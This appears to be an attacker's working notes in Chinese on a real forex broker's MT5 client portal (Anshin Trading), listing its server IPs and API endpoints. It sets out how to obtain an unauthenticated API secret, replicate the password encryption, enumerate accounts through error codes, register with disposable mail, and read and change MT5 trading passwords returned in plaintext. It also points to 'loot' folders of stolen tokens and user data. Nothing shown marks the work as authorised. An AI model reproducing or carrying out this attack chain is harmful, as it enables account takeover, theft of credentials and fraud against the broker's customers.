# Anshin Trading MT5 客户门户攻击链

**栈:** Next.js App Router + `baseURL:/api` → 网关 `/gateway/*`；Google LB；仅 443。  
**品牌:** Anshin Trading / portal.anshinfx.app / anshinfx.com（FSCA 文案）。  
**多入口同库:** `121.40.195.93`（杭州）与 `39.106.10.8`（北京）前端 chunk 一致、用户库共享（uid 连续、邮箱跨 IP EXISTS）。

---

## 未授权 crown：apiSecret

```
GET /api/app/apiSecret
→ {"code":"G_0000","data":{"apiSecretKey":"...","publicKey":"MIGf..."}}
```

- 匿名可拿；每次可能轮换 key+RSA 公钥
- 所有后续请求头：`api-secret-key: <key>`
- 登录后另加：`Authorization: Bearer <JWT>`

---

## 密码加密（必须对齐前端）

前端 `h.vQ(password,"post",publicKey)` / `encryptLong`：

1. **`a.o4.encodeURI(password)` = js-base64 URI 安全 Base64**（`+/`→`-_`，去 padding）  
   **不是** JS 全局 `encodeURI()` —— 搞错会 RSA 能解但业务 `PARAM_ERROR` / 登录偶发能过注册不过
2. RSA PKCS1_v1_5 加密该 Base64 串
3. jsbn `encrypt` 产出 **hex**，再经自定义 `o(hex)` 转 b64（与标准 b64(ct) 对 128B 块常相同）
4. `encryptLong` 返回 **数组**；提交取 `data[0]` 字符串

密码策略：`/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$^+!;,*%])[A-Za-z\d@#$^+!;,*%]{8,15}$/`

Node 参考（forge）：
```js
// base64EncodeURI(pwd) → pub.encrypt(..., 'RSAES-PKCS1-V1_5') → bytesToHex → o(hex)
```

---

## 账号枚举

`POST /api/app/user/login`（密文密码 + deviceId/deviceType/deviceName）：

| code | 含义 |
|------|------|
| `USER_01_01` ACCOUNT_NOT_EXIST | 邮箱/MT5 不存在 |
| `USER_01_08` PASSWORD_ERROR | **存在** |
| MT5 错密 data `13 Not found` | 与 `3006 Invalid account password` 不同，注意区分 |

已见存在：`<EMAIL-REDACTED>`、`<EMAIL-REDACTED>`。

`loginType`: `mail`（字段 `mail`）| `mt5Login`（字段 `mt5Login`）。

---

## 开放注册

1. `POST /api/app/verify/mail/send/code`  
   `{"action":"register","language":"zh-CN","mail":"..."}` → 邮件验证码（Guerrilla 可收）
2. `POST /api/app/user/register`  
   `registerType,mail,country,password(RSA),inviteCode,deviceId,deviceType,deviceName,code,idToken,fcmToken`
3. 成功 → JWT HS256 payload：`role=member,userId,email,registerType`

重置密码发码 action：**`forgotPsw`**（不是 forgotPassword）。  
重置体：`verifyMode:mail, mail, password(RSA), deviceId, code`。

---

## Critical：MT5 明文密码 + 可改密

```
GET /api/app/userCenter/mt5/accounts
→ Demo/Real 列表（account, balance, leverage, alias）

GET /api/app/userCenter/mt5/info?account=<login>
→ password 字段 **明文** + server 名（Anshin Trading (Pty) Ltd）

POST /api/app/userCenter/mt5/update/tradePassword
{"account":"...","password":"<RSA密文>"} → G_0000
```

- 本用户名下 Demo/Real **均可读可改** → MT5 终端接管
- 跨用户 account 探测：归属校验，不返回他人密码（本轮未 IDOR）
- 注册后常自动挂 Demo（3004xxx）+ Real（67xxx）连续号

其它有用：`/app/userCenter/info`、`/app/userCenter/kyc/status`、`/app/country`（smsProvider 等）。  
代理树/佣金需 `isAgent`；`agent/apply` 可 SUCCESS 但重登仍 false（待审）。

---

## 无什么

- 链上私钥/助记词（MT5 经纪商模型，非 Web3 热钱包）
- 全站用户 list / 跨用户 KYC
- 非 443 管理口（常见仅 443）
- JWT none / 弱密钥未默认命中

---

## 工件模式

`/tmp/t12140/` · `/tmp/t39106/` — REPORT.md, loot/auth_token.txt, userdata/, enc.js
